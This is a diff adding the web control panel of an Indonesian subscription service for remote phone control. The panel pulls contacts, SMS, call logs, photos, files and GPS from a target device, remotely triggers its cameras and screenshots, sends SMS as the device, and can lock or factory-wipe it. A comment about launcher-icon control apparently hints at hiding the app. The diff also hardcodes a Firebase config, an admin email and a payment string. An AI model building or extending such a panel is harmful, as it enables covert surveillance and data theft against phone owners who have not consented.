+      <button class="back-btn" onclick="showScreen('screen-dashboard')"><i class="fa-solid fa-arrow-left"></i></button>
+      <h2 id="dh-title">Perangkat</h2>
+    </div>
+    <div class="device-info-bar">
+      <div>
+        <div class="d-name" id="dh-device-name">-</div>
+        <div class="d-status online" id="dh-status"><i class="fa-solid fa-circle" style="font-size:0.5rem"></i> Online</div>
+      </div>
+      <div style="text-align:right">
+        <div style="color:rgba(255,255,255,0.6);font-size:0.75rem" id="dh-last-seen">-</div>
+      </div>
+    </div>
+
+    <div class="backup-btn-wrap" style="padding-top:16px">
+      <button class="backup-btn" id="btn-backup">
+        <i class="fa-solid fa-cloud-arrow-up"></i> BACKUP SEKARANG
+      </button>
+    </div>
+    <div id="dh-sync-status" style="margin:0 16px 4px;padding:10px 14px;background:rgba(34,197,94,0.08);border-radius:12px;border:1px solid rgba(34,197,94,0.2);display:flex;align-items:center;gap:8px;font-size:0.82rem;color:#86efac">
+      <i class="fa-solid fa-circle-check"></i>
+      <span id="dh-sync-text">Terhubung ke Firebase</span>
+    </div>
+
+    <div class="subscription-box">
+      <div class="sub-title">Status Langganan Download</div>
+      <div class="sub-status" id="subscription-status">Belum aktif</div>
+      <button class="btn btn-green btn-sm" style="margin-top:10px" onclick="openSubscriptionModal()">
+        <i class="fa-solid fa-credit-card"></i> Beli Paket
+      </button>
+    </div>
+
+    <!-- Kontrol ikon launcher -->
+    <!-- Kontrol keamanan aplikasi -->
+    <div style="margin:10px 16px 4px;display:flex;gap:8px">
+      <button onclick="sendCommand('lock_app',true);showToast('Perintah kunci aplikasi dikirim...')"
+        style="flex:1;padding:11px 8px;background:rgba(30,30,50,0.8);color:#e5e7eb;border:1px solid #374151;border-radius:12px;font-size:0.82rem;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px">
+        <i class="fa-solid fa-lock"></i> Kunci Aplikasi
+      </button>
+    </div>
+
+    <div class="feature-grid">
+      <button class="feature-btn" onclick="showFeature('contacts')">
+        <div class="f-icon ic-blue"><i class="fa-solid fa-address-book" style="color:white"></i></div>
+        <span class="f-label">Kontak</span>
+      </button>
+      <button class="feature-btn" onclick="showFeature('sms')">
+        <div class="f-icon ic-green"><i class="fa-solid fa-comment-sms" style="color:white"></i></div>
+        <span class="f-label">SMS/Chat</span>
+      </button>
+      <button class="feature-btn" onclick="showFeature('gallery')">
+        <div class="f-icon ic-purple"><i class="fa-solid fa-images" style="color:white"></i></div>
+        <span class="f-label">Galeri</span>
+      </button>
+      <button class="feature-btn" onclick="showFeature('files')">
+        <div class="f-icon ic-orange"><i class="fa-solid fa-folder-open" style="color:white"></i></div>
+        <span class="f-label">File</span>
+      </button>
+      <button class="feature-btn" onclick="showFeature('camera')">
+        <div class="f-icon ic-teal"><i class="fa-solid fa-camera" style="color:white"></i></div>
+        <span class="f-label">Kamera</span>
+      </button>
+      <button class="feature-btn" onclick="showFeature('gps')">
+        <div class="f-icon ic-red"><i class="fa-solid fa-location-dot" style="color:white"></i></div>
+        <span class="f-label">GPS</span>
+      </button>
+      <button class="feature-btn" onclick="showFeature('calls')">
+        <div class="f-icon ic-indigo"><i class="fa-solid fa-phone" style="color:white"></i></div>
+        <span class="f-label">Telepon</span>
+      </button>
+      <button class="feature-btn" onclick="showFeature('ringtone')">
+        <div class="f-icon ic-yellow"><i class="fa-solid fa-bell" style="color:white"></i></div>
+        <span class="f-label">Nada</span>
+      </button>
+      <button class="feature-btn" onclick="showFeature('screen-ctrl')">
+        <div class="f-icon ic-cyan"><i class="fa-solid fa-display" style="color:white"></i></div>
+        <span class="f-label">Layar</span>
+      </button>
+      <button class="feature-btn" onclick="showFeature('wipe')">
+        <div class="f-icon ic-red"><i class="fa-solid fa-skull" style="color:white"></i></div>
+        <span class="f-label">Wipe</span>
+      </button>
+    </div>
+  </div>
+
+  <!-- ========== CONTACTS ========== -->
+  <div id="screen-contacts" class="screen">
+    <div class="topbar">
+      <button class="back-btn" onclick="showScreen('screen-device-home')"><i class="fa-solid fa-arrow-left"></i></button>
+      <h2><i class="fa-solid fa-address-book" style="color:#60a5fa;margin-right:6px"></i> Kontak</h2>
+      <button class="topbar-action" onclick="openAddContact()"><i class="fa-solid fa-plus"></i></button>
+    </div>
+    <div class="search-bar">
+      <div class="search-wrap">
+        <i class="fa-solid fa-magnifying-glass search-icon"></i>
+        <input type="search" id="contact-search" placeholder="Cari kontak..." oninput="filterContacts(this.value)">
+      </div>
+    </div>
+    <div id="contacts-list" style="background:white;margin:12px 16px;border-radius:18px;overflow:hidden;box-shadow:0 4px 16px rgba(0,0,0,0.2)">
+      <div class="loader"><div class="spinner" style="border-top-color:var(--green)"></div></div>
+    </div>
+  </div>
+
+  <!-- ========== SMS LIST ========== -->
+  <div id="screen-sms" class="screen">
+    <div class="topbar">
+      <button class="back-btn" onclick="showScreen('screen-device-home')"><i class="fa-solid fa-arrow-left"></i></button>
+      <h2><i class="fa-solid fa-comment-sms" style="color:#66dd66;margin-right:6px"></i> SMS / Chat</h2>
+      <button class="topbar-action" onclick="openSendSms()"><i class="fa-solid fa-paper-plane"></i></button>
+    </div>
+    <div class="search-bar">
+      <div class="search-wrap">
+        <i class="fa-solid fa-magnifying-glass search-icon"></i>
+        <input type="search" placeholder="Cari pesan..." oninput="filterSms(this.value)">
+      </div>
+    </div>
+    <div id="sms-list" style="background:white;margin:12px 16px;border-radius:18px;overflow:hidden;box-shadow:0 4px 16px rgba(0,0,0,0.2)">
+      <div class="loader"><div class="spinner" style="border-top-color:var(--green)"></div></div>
+    </div>
+  </div>
+
+  <!-- ========== SMS DETAIL ========== -->
+  <div id="screen-sms-detail" class="screen">
+    <div class="topbar">
+      <button class="back-btn" onclick="showScreen('screen-sms')"><i class="fa-solid fa-arrow-left"></i></button>
+      <h2 id="sms-detail-name">Percakapan</h2>
+      <button class="topbar-action" onclick="deleteSmsThread()" style="background:#e53e3e"><i class="fa-solid fa-trash"></i></button>
+    </div>
+    <div class="chat-container" id="chat-messages"></div>
+    <div class="chat-input-bar">
+      <input type="text" class="chat-input" id="chat-reply-input" placeholder="Balas pesan...">
+      <button class="chat-send" onclick="sendReply()"><i class="fa-solid fa-paper-plane"></i></button>
+    </div>
+  </div>
+
+  <!-- ========== GALLERY ========== -->
+  <div id="screen-gallery" class="screen">
+    <div class="topbar">
+      <button class="back-btn" onclick="showScreen('screen-device-home')"><i class="fa-solid fa-arrow-left"></i></button>
+      <h2><i class="fa-solid fa-images" style="color:#a78bfa;margin-right:6px"></i> Galeri</h2>
+    </div>
+    <div style="display:flex;gap:8px;padding:10px 16px">
+      <button class="btn btn-green btn-sm" onclick="filterGallery('all')" id="gf-all">Semua</button>
+      <button class="btn btn-outline btn-sm" onclick="filterGallery('image')" id="gf-img">📷 Foto</button>
+      <button class="btn btn-outline btn-sm" onclick="filterGallery('video')" id="gf-vid">🎬 Video</button>
+    </div>
+    <div class="gallery-grid" id="gallery-grid">
+      <div class="loader" style="grid-column:1/-1"><div class="spinner"></div></div>
+    </div>
+  </div>
+
+  <!-- ========== FILE MANAGER ========== -->
+  <div id="screen-files" class="screen">
+    <div class="topbar">
+      <button class="back-btn" onclick="fileGoBack()"><i class="fa-solid fa-arrow-left"></i></button>
+      <h2><i class="fa-solid fa-folder-open" style="color:#fb923c;margin-right:6px"></i> File Manager</h2>
+    </div>
+    <div class="breadcrumb" id="file-breadcrumb"><span>📂 Internal Storage</span></div>
+    <div id="file-list" style="background:white;margin:0 16px 16px;border-radius:18px;overflow:hidden;box-shadow:0 4px 16px rgba(0,0,0,0.2)">
+      <div class="loader"><div class="spinner" style="border-top-color:#fb923c"></div></div>
+    </div>
+  </div>
+
+  <!-- ========== CAMERA ========== -->
+  <div id="screen-camera" class="screen">
+    <div class="topbar">
+      <button class="back-btn" onclick="showScreen('screen-device-home')"><i class="fa-solid fa-arrow-left"></i></button>
+      <h2><i class="fa-solid fa-camera" style="color:#34d399;margin-right:6px"></i> Kamera Jarak Jauh</h2>
+    </div>
+    <div class="camera-preview" id="camera-preview">
+      <div style="text-align:center;padding:20px">
+        <i class="fa-solid fa-camera" style="font-size:3rem;color:rgba(255,255,255,0.2);display:block;margin-bottom:12px"></i>
+        <p>Tekan tombol untuk mengambil foto/video dari perangkat</p>
+      </div>
+    </div>
+    <div class="camera-controls">
+      <div class="camera-btn-row">
+        <button class="btn btn-green" onclick="sendCommand('camera','photo_front')">
+          <i class="fa-solid fa-camera-rotate"></i> Kamera Depan
+        </button>
+        <button class="btn btn-blue" onclick="sendCommand('camera','photo_back')">
+          <i class="fa-solid fa-camera"></i> Kamera Belakang
+        </button>
+      </div>
+      <div class="camera-btn-row">
+        <button class="btn" style="background:linear-gradient(145deg,#a78bfa,#6d28d9);color:white" onclick="sendCommand('camera','video_front')">
+          <i class="fa-solid fa-video"></i> Video Depan
+        </button>
+        <button class="btn" style="background:linear-gradient(145deg,#f472b6,#be185d);color:white" onclick="sendCommand('camera','video_back')">
+          <i class="fa-solid fa-video"></i> Video Belakang
+        </button>
+      </div>
+      <div class="section-header" style="padding-left:0;margin-top:8px">Hasil Terbaru</div>
+      <div id="camera-results" style="background:white;border-radius:16px;padding:10px;box-shadow:0 4px 16px rgba(0,0,0,0.2)">
+        <div class="empty-state" style="padding:20px">
+          <i class="fa-solid fa-image" style="color:#bbb"></i>
+          <p style="color:#bbb">Belum ada foto/video</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== RINGTONE ========== -->
+  <div id="screen-ringtone" class="screen">
+    <div class="topbar">
+      <button class="back-btn" onclick="showScreen('screen-device-home')"><i class="fa-solid fa-arrow-left"></i></button>
+      <h2><i class="fa-solid fa-bell" style="color:#fbbf24;margin-right:6px"></i> Nada Dering</h2>
+    </div>
+    <div style="padding:16px">
+      <div class="card" style="margin:0 0 16px;text-align:center">
+        <p style="color:var(--text-muted);font-size:0.85rem;margin-bottom:6px">Mode Saat Ini</p>
+        <h3 id="current-ring-mode" style="font-size:1.4rem;font-weight:900">🔔 Normal</h3>
+      </div>
+    </div>
+    <div class="control-grid">
+      <div class="control-card">
+        <div class="control-icon ic-yellow"><i class="fa-solid fa-bell" style="color:white"></i></div>
+        <div class="control-info"><h4>Nada Dering</h4><p>Aktifkan nada dering penuh</p></div>
+        <button class="ctrl-btn btn-green" onclick="sendRingCommand('ring')" style="background:var(--green);color:white">
+          <i class="fa-solid fa-play"></i> Aktifkan
+        </button>
+      </div>
+      <div class="control-card">
+        <div class="control-icon ic-indigo"><i class="fa-solid fa-mobile-screen-button" style="color:white"></i></div>
+        <div class="control-info"><h4>Getar</h4><p>Mode getar saja</p></div>
+        <button class="ctrl-btn" style="background:#818cf8;color:white" onclick="sendRingCommand('vibrate')">
+          <i class="fa-solid fa-mobile-screen"></i> Getar
+        </button>
+      </div>
+      <div class="control-card">
+        <div class="control-icon" style="background:linear-gradient(135deg,#9ca3af,#4b5563)"><i class="fa-solid fa-bell-slash" style="color:white"></i></div>
+        <div class="control-info"><h4>Senyap</h4><p>Matikan semua suara</p></div>
+        <button class="ctrl-btn" style="background:#6b7280;color:white" onclick="sendRingCommand('silent')">
+          <i class="fa-solid fa-volume-xmark"></i> Senyap
+        </button>
+      </div>
+      <div class="control-card">
+        <div class="control-icon ic-red"><i class="fa-solid fa-siren-on" style="color:white"></i></div>
+        <div class="control-info"><h4>Alarm Keras</h4><p>Bunyikan alarm anti-maling</p></div>
+        <button class="ctrl-btn btn-red" style="background:#e53e3e;color:white" onclick="sendRingCommand('alarm')">
+          <i class="fa-solid fa-siren-on"></i> ALARM!
+        </button>
+      </div>
+      <div class="control-card">
+        <div class="control-icon" style="background:linear-gradient(135deg,#374151,#111827)"><i class="fa-solid fa-stop" style="color:white"></i></div>
+        <div class="control-info"><h4>Stop Nada</h4><p>Hentikan semua nada/alarm yang aktif</p></div>
+        <button class="ctrl-btn" style="background:#374151;color:white" onclick="sendCommand('ringtone','stop');showToast('🔇 Nada dihentikan')">
+          <i class="fa-solid fa-stop"></i> Stop
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== SCREEN CONTROL ========== -->
+  <div id="screen-screen-ctrl" class="screen">
+    <div class="topbar">
+      <button class="back-btn" onclick="showScreen('screen-device-home')"><i class="fa-solid fa-arrow-left"></i></button>
+      <h2><i class="fa-solid fa-display" style="color:#22d3ee;margin-right:6px"></i> Kontrol Layar</h2>
+    </div>
+    <div style="padding:16px">
+      <div class="card" style="margin:0 0 16px;text-align:center">
+        <p style="color:var(--text-muted);font-size:0.85rem;margin-bottom:6px">Status Layar</p>
+        <h3 id="screen-status-text" style="font-size:1.2rem;font-weight:900">💡 Tidak Diketahui</h3>
+      </div>
+    </div>
+    <div class="control-grid">
+      <div class="control-card">
+        <div class="control-icon" style="background:linear-gradient(135deg,#fbbf24,#d97706)"><i class="fa-solid fa-sun" style="color:white"></i></div>
+        <div class="control-info"><h4>Hidupkan Layar</h4><p>Nyalakan layar perangkat</p></div>
+        <button class="ctrl-btn" style="background:linear-gradient(145deg,#fbbf24,#d97706);color:white" onclick="sendCommand('screen','on')">
+          <i class="fa-solid fa-power-off"></i> Hidup
+        </button>
+      </div>
+      <div class="control-card">
+        <div class="control-icon" style="background:linear-gradient(135deg,#374151,#111827)"><i class="fa-solid fa-moon" style="color:white"></i></div>
+        <div class="control-info"><h4>Matikan Layar</h4><p>Kunci dan matikan layar</p></div>
+        <button class="ctrl-btn" style="background:#374151;color:white" onclick="sendCommand('screen','off')">
+          <i class="fa-solid fa-power-off"></i> Mati
+        </button>
+      </div>
+      <div class="control-card">
+        <div class="control-icon ic-teal"><i class="fa-solid fa-camera" style="color:white"></i></div>
+        <div class="control-info"><h4>Screenshot</h4><p>Ambil tangkapan layar</p></div>
+        <button class="ctrl-btn" style="background:linear-gradient(145deg,#34d399,#059669);color:white" onclick="sendCommand('screen','screenshot')">
+          <i class="fa-solid fa-camera"></i> Ambil
+        </button>
+      </div>
+      <div class="control-card">
+        <div class="control-icon ic-red"><i class="fa-solid fa-lock" style="color:white"></i></div>
+        <div class="control-info"><h4>Kunci Perangkat</h4><p>Kunci layar perangkat</p></div>
+        <button class="ctrl-btn" style="background:#e53e3e;color:white" onclick="sendCommand('screen','lock')">
+          <i class="fa-solid fa-lock"></i> Kunci
+        </button>
+      </div>
+    </div>
+    <div class="section-header">Screenshot Terbaru</div>
+    <div id="screenshot-results" style="background:white;margin:0 16px 16px;border-radius:16px;padding:10px;box-shadow:0 4px 16px rgba(0,0,0,0.2)">
+      <div class="empty-state" style="padding:20px">
+        <i class="fa-solid fa-image" style="color:#bbb"></i>
+        <p style="color:#bbb">Belum ada screenshot</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== WIPE / DANGER ZONE ========== -->
+  <div id="screen-wipe" class="screen">
+    <div class="topbar">
+      <button class="back-btn" onclick="showScreen('screen-device-home')"><i class="fa-solid fa-arrow-left"></i></button>
+      <h2><i class="fa-solid fa-skull" style="color:#e53e3e;margin-right:6px"></i> Zona Bahaya</h2>
+    </div>
+    <div style="padding:16px">
+      <div class="card" style="border:2px solid #e53e3e;margin-bottom:16px">
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px">
+          <i class="fa-solid fa-triangle-exclamation" style="color:#e53e3e;font-size:1.4rem"></i>
+          <h3 style="color:#e53e3e;font-size:1rem">PERINGATAN KERAS</h3>
+        </div>
+        <p style="color:var(--text-muted);font-size:0.85rem;line-height:1.5">Tindakan di bawah ini bersifat <strong>PERMANEN</strong> dan tidak dapat dibatalkan. Semua data perangkat akan dihapus sepenuhnya termasuk foto, kontak, aplikasi, dan seluruh file.</p>
+      </div>
+      <div class="control-card" style="border:1px solid #fee2e2">
+        <div class="control-icon ic-red"><i class="fa-solid fa-trash-can" style="color:white"></i></div>
+        <div class="control-info">
+          <h4 style="color:#e53e3e">Factory Reset</h4>
+          <p>Hapus SEMUA data perangkat secara permanen (tidak bisa dibatalkan)</p>
+        </div>
+        <button class="ctrl-btn" style="background:#e53e3e;color:white" onclick="confirmWipe()">
+          <i class="fa-solid fa-skull"></i> WIPE
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== GPS ========== -->
+  <div id="screen-gps" class="screen">
+    <div class="topbar">
+      <button class="back-btn" onclick="showScreen('screen-device-home')"><i class="fa-solid fa-arrow-left"></i></button>
+      <h2><i class="fa-solid fa-location-dot" style="color:#f87171;margin-right:6px"></i> Lokasi GPS</h2>
+      <button class="topbar-action" onclick="refreshGPS()"><i class="fa-solid fa-rotate"></i></button>
+    </div>
+    <div class="gps-map" id="gps-map">
+      <div style="text-align:center;color:#666">
+        <i class="fa-solid fa-map-location-dot" style="font-size:2.5rem;color:#bbb;display:block;margin-bottom:8px"></i>
+        <p style="font-size:0.85rem">Menunggu data lokasi...</p>
+      </div>
+    </div>
+    <div class="gps-data">
+      <div class="gps-row"><span class="gr-label">📍 Latitude</span><span class="gr-val" id="gps-lat">-</span></div>
+      <div class="gps-row"><span class="gr-label">📍 Longitude</span><span class="gr-val" id="gps-lng">-</span></div>
+      <div class="gps-row"><span class="gr-label">🎯 Akurasi</span><span class="gr-val" id="gps-acc">-</span></div>
+      <div class="gps-row"><span class="gr-label">🕐 Terakhir Update</span><span class="gr-val" id="gps-time">-</span></div>
+      <div class="gps-row"><span class="gr-label">🏙️ Alamat</span><span class="gr-val" id="gps-addr" style="font-size:0.82rem;max-width:60%;text-align:right">-</span></div>
+    </div>
+    <div style="padding:0 16px 16px">
+      <button class="btn btn-green" onclick="openGoogleMaps()">
+        <i class="fa-solid fa-map-location-dot"></i> Buka di Google Maps
+      </button>
+    </div>
+  </div>
+
+  <!-- ========== CALL LOG ========== -->
+  <div id="screen-calls" class="screen">
+    <div class="topbar">
+      <button class="back-btn" onclick="showScreen('screen-device-home')"><i class="fa-solid fa-arrow-left"></i></button>
+      <h2><i class="fa-solid fa-phone" style="color:#818cf8;margin-right:6px"></i> Riwayat Telepon</h2>
+    </div>
+    <div style="display:flex;gap:8px;padding:10px 16px">
+      <button class="btn btn-green btn-sm" onclick="filterCalls('all')">Semua</button>
+      <button class="btn btn-outline btn-sm" onclick="filterCalls('incoming')">📞 Masuk</button>
+      <button class="btn btn-outline btn-sm" onclick="filterCalls('outgoing')">📤 Keluar</button>
+      <button class="btn btn-outline btn-sm" onclick="filterCalls('missed')">❌ Tidak Dijawab</button>
+    </div>
+    <div id="calls-list" style="background:white;margin:0 16px;border-radius:18px;overflow:hidden;box-shadow:0 4px 16px rgba(0,0,0,0.2)">
+      <div class="loader"><div class="spinner" style="border-top-color:#818cf8"></div></div>
+    </div>
+  </div>
+
+</div><!-- end #app -->
+
+<!-- ========== MODALS ========== -->
+<div class="modal-overlay" id="modal-contact-edit">
+  <div class="modal-sheet">
+    <div class="modal-handle"></div>
+    <div class="modal-title">✏️ Edit Kontak</div>
+    <input type="hidden" id="edit-contact-id">
+    <div class="input-group"><label>Nama</label><input type="text" id="edit-contact-name" class="input-field"></div>
+    <div class="input-group"><label>Nomor Telepon</label><input type="tel" id="edit-contact-phone" class="input-field" inputmode="tel"></div>
+    <div class="input-group"><label>Email (opsional)</label><input type="email" id="edit-contact-email" class="input-field"></div>
+    <button class="btn btn-green" onclick="saveContact()"><i class="fa-solid fa-floppy-disk"></i> Simpan</button>
+    <button class="btn btn-outline" onclick="closeModal('modal-contact-edit')" style="margin-top:8px">Batal</button>
+  </div>
+</div>
+
+<div class="modal-overlay" id="modal-send-sms">
+  <div class="modal-sheet">
+    <div class="modal-handle"></div>
+    <div class="modal-title">📤 Kirim SMS Baru</div>
+    <div class="input-group"><label>Nomor Tujuan</label><input type="tel" id="sms-to-number" class="input-field" placeholder="08xxxxxxxxx" inputmode="tel"></div>
+    <div class="input-group"><label>Pesan</label><textarea id="sms-body" class="input-field" rows="4" placeholder="Ketik pesan..." style="resize:vertical"></textarea></div>
+    <button class="btn btn-green" onclick="sendNewSms()"><i class="fa-solid fa-paper-plane"></i> Kirim SMS</button>
+    <button class="btn btn-outline" onclick="closeModal('modal-send-sms')" style="margin-top:8px">Batal</button>
+  </div>
+</div>
+
+<div class="modal-overlay" id="modal-gallery-view">
+  <div style="position:fixed;inset:0;display:flex;align-items:center;justify-content:center;padding:16px;">
+    <div style="background:#000;border-radius:18px;max-width:400px;width:100%;overflow:hidden;position:relative;">
+      <button onclick="closeModal('modal-gallery-view')" style="position:absolute;top:10px;right:10px;background:rgba(0,0,0,0.7);border:none;color:white;width:36px;height:36px;border-radius:50%;cursor:pointer;font-size:1.1rem;z-index:10"><i class="fa-solid fa-xmark"></i></button>
+      <div id="gallery-view-container" style="min-height:200px;background:#000;display:flex;align-items:center;justify-content:center"></div>
+      <div style="padding:12px">
+        <div id="gallery-view-name" style="color:#9ca3af;font-size:0.78rem;text-align:center;margin-bottom:8px;word-break:break-all"></div>
+        <div style="display:flex;gap:8px">
+          <button class="btn btn-green" style="flex:1" onclick="downloadGalleryItem()"><i class="fa-solid fa-download"></i> Unduh</button>
+          <button class="btn btn-red" style="flex:1" onclick="deleteGalleryItem()"><i class="fa-solid fa-trash"></i> Hapus</button>
+        </div>
+        <div id="gallery-req-status" style="display:none;text-align:center;color:#fbbf24;font-size:0.8rem;margin-top:8px"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="modal-overlay" id="modal-subscription">
+  <div class="modal-sheet">
+    <div class="modal-handle"></div>
+    <div class="modal-title">Beli Paket Langganan</div>
+    <div class="plan-grid">
+      <button class="btn-nominal" onclick="setNominal(25000,7,this)">7 hari<br>Rp25.000</button>
+      <button class="btn-nominal" onclick="setNominal(75000,14,this)">14 hari<br>Rp75.000</button>
+      <button class="btn-nominal" onclick="setNominal(150000,30,this)">30 hari<br>Rp150.000</button>
+    </div>
+    <input type="number" id="amount-input" class="input-field" placeholder="Pilih paket di atas..." readonly>
+    <button class="btn btn-green" style="margin-top:10px" onclick="generateQR()">BELI PAKET</button>
+
+    <div id="qr-container">
+      <div id="pay-timer" style="font-size:11px;color:#e74c3c;font-weight:800;margin-bottom:8px;">Selesaikan dalam 03:00</div>
+      <div id="capture-area">
+        <div id="qrcode"></div>
+        <div id="total-display"></div>
+        <div style="margin-top:10px;padding-top:8px;border-top:1px dashed #ddd;">
+          <p id="tr-id" style="font-size:9px;font-weight:800;color:#999;margin:0;"></p>
+        </div>
+      </div>
+      <div class="payment-instructions">
+        <h4>Cara Pembayaran:</h4>
+        <ol>
+          <li>Klik tombol <b>SIMPAN QR CODE</b>.</li>
+          <li>Buka aplikasi <b>BCA, Dana, Gojek</b>, dll.</li>
+          <li>Pilih menu <b>Scan / QRIS</b>.</li>
+          <li>Klik ikon <b>Galeri</b> dan pilih gambar tadi.</li>
+          <li>Nominal muncul otomatis, bayar sekarang.</li>
+        </ol>
+      </div>
+      <button class="btn btn-blue" style="margin-top:12px" onclick="downloadQR()">SIMPAN QR CODE</button>
+      <button class="btn btn-green" style="margin-top:8px" onclick="confirmSubscriptionPayment()">KONFIRMASI</button>
+    </div>
+    <button class="btn btn-outline" onclick="closeModal('modal-subscription')" style="margin-top:8px">Tutup</button>
+  </div>
+</div>
+
+<div id="toast"></div>
+
+<!-- ========== FIREBASE SDK ========== -->
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+
+<script>
+// ============================================================
+// FIREBASE CONFIG - Ganti dengan konfigurasi Firebase Anda
+// ============================================================
+const firebaseConfig = {
+  apiKey: "AIzaSyDGmV5ZIVsR38zyLCQ6dbtP1Fw9dV36qRk",
+  authDomain: "altomedia-8f793.firebaseapp.com",
+  databaseURL: "https://altomedia-8f793-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "altomedia-8f793",
+  storageBucket: "altomedia-8f793.firebasestorage.app",
+  messagingSenderId: "327513974065",
+  appId: "1:327513974065:android:d5be38ffef1bbd3f91bc10"
+};
+
+// ============================================================
+// INIT
+// ============================================================
+let db, auth, storage, currentUser, currentDevice, deviceRef;
+let contactsData = [], smsData = [], callsData = [], galleryData = [];
+let contactsMap = {}, filesDataMap = {};
+let currentSmsThread = null;
+let currentGalleryItem = null;
+let fileHistory = [];
+let subscriptionData = null;
+let selectedPlanDays = null;
+let selectedPlanAmount = null;
+let currentSubscriptionTrxId = null;
+let qrisTimer;
+const QRIS_BASE = "00020101021126610014COM.GO-JEK.WWW01189360091439663050810210G9663050810303UMI51440014ID.CO.QRIS.WWW0215ID10254671365660303UMI5204549953033605802ID5917ALTOMEDIA, Grosir6008KARAWANG61054136162070703A016304D21A";
+const ADMIN_EMAIL = 'altomediaindonesia@gmail.com';
+
+// ── REAL-TIME LISTENER MANAGEMENT ──────────────────────────────────────
+const activeDataListeners = {};
+function attachDataListener(key, ref, callback) {
+  if (activeDataListeners[key]) {
+    try { activeDataListeners[key].ref.off('value', activeDataListeners[key].fn); } catch(e){}
+    delete activeDataListeners[key];
+  }
+  const fn = ref.on('value', callback);
+  activeDataListeners[key] = { ref, fn };
+}
+function detachDataListeners() {
+  Object.keys(activeDataListeners).forEach(key => {
+    try { activeDataListeners[key].ref.off('value', activeDataListeners[key].fn); } catch(e){}
+  });
+  for (const k in activeDataListeners) delete activeDataListeners[k];
+}
+
+try {
+  firebase.initializeApp(firebaseConfig);
+  db = firebase.database();
+  auth = firebase.auth();
+  storage = firebase.storage();
+} catch(e) {
+  console.error('Firebase init error:', e);
+}
+
+// ============================================================
+// SCREEN NAVIGATION
+// ============================================================
+function showScreen(id) {
+  // Reset delete mode when leaving dashboard
+  if (id !== 'screen-dashboard' && deviceDeleteMode) {
+    deviceDeleteMode = false;
+    selectedDeviceIds.clear();
+    const bar = document.getElementById('delete-mode-bar');
+    if (bar) bar.classList.remove('visible');
+    const label = document.getElementById('device-section-label');
+    if (label) label.textContent = 'Perangkat Aktif';
+    const btn = document.getElementById('btn-manage-devices');
+    if (btn) { btn.style.background = 'rgba(255,255,255,0.12)'; btn.style.color = '#f87171'; }
+  }
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  window.scrollTo(0, 0);
+}
+
+function showFeature(feature) {
+  const map = {
+    'contacts': 'screen-contacts',
+    'sms': 'screen-sms',
+    'gallery': 'screen-gallery',
+    'files': 'screen-files',
+    'camera': 'screen-camera',
+    'gps': 'screen-gps',
+    'calls': 'screen-calls',
+    'ringtone': 'screen-ringtone',
+    'screen-ctrl': 'screen-screen-ctrl',
+    'wipe': 'screen-wipe',
+  };
+  if (map[feature]) {
+    showScreen(map[feature]);
+    loadFeatureData(feature);
+  }
+}
+
+// ============================================================
+// UTILS
+// ============================================================
+function showToast(msg, duration = 2500) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.style.display = 'block';
+  setTimeout(() => t.style.display = 'none', duration);
+}
+
+function htmlEscape(str) {
+  return String(str == null ? '' : str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
+
+function openModal(id) {
+  document.getElementById(id).classList.add('open');
+}
+function closeModal(id) {
+  document.getElementById(id).classList.remove('open');
+}
+
+function formatDate(ts) {
+  if (!ts) return '-';
+  const d = new Date(ts);
+  return d.toLocaleDateString('id-ID') + ' ' + d.toLocaleTimeString('id-ID', {hour:'2-digit',minute:'2-digit'});
+}
+
+function formatDuration(secs) {
+  if (!secs) return '0 det';
+  const m = Math.floor(secs / 60), s = secs % 60;
+  return m > 0 ? `${m} mnt ${s} det` : `${s} det`;
+}
+
+function getInitials(name) {
+  if (!name) return '?';
+  return name.split(' ').map(w => w[0]).join('').toUpperCase().slice(0, 2);
+}
+
+const avatarColors = ['#3daa3d','#1d4ed8','#6d28d9','#c2410c','#059669','#dc2626','#d97706','#be185d','#0e7490'];
+function getAvatarColor(str) {
+  let hash = 0;
+  for (let c of (str||'')) hash += c.charCodeAt(0);
+  return avatarColors[hash % avatarColors.length];
+}
+
+function getDevicePath(subpath) {
+  const uid = currentUser.uid;
+  const did = currentDevice.id;
+  return `phoneset/users/${uid}/devices/${did}/${subpath}`;
+}
+
+// ============================================================
+// AUTH HELPERS
+// ============================================================
+function getAuthErrorMsg(code) {
+  const map = {
+    'auth/user-not-found': 'Akun tidak ditemukan',
+    'auth/wrong-password': 'Password salah',
+    'auth/invalid-credential': 'Email atau password salah',
+    'auth/invalid-email': 'Format email tidak valid',
+    'auth/email-already-in-use': 'Email sudah terdaftar',
+    'auth/weak-password': 'Password terlalu lemah (min 6 karakter)',
+    'auth/too-many-requests': 'Terlalu banyak percobaan. Coba lagi nanti.',
+    'auth/network-request-failed': 'Gagal terhubung ke jaringan',
+    'auth/cancelled-popup-request': '',
+  };
+  return map[code] || 'Terjadi kesalahan. Coba lagi.';
+}
+
+async function saveUserProfile(user, extraName) {
+  const name = extraName || user.displayName || user.email.split('@')[0];
+  const ref = db.ref(`phoneset/users/${user.uid}/profile`);
+  const snap = await ref.once('value');
+  if (!snap.exists()) {
+    await ref.set({ name, email: user.email, createdAt: Date.now(), provider: user.providerData[0]?.providerId || 'password' });
+  }
+}
+
+// ============================================================
+// AUTH — EMAIL / PASSWORD
+// ============================================================
+document.getElementById('btn-masuk').onclick = async function() {
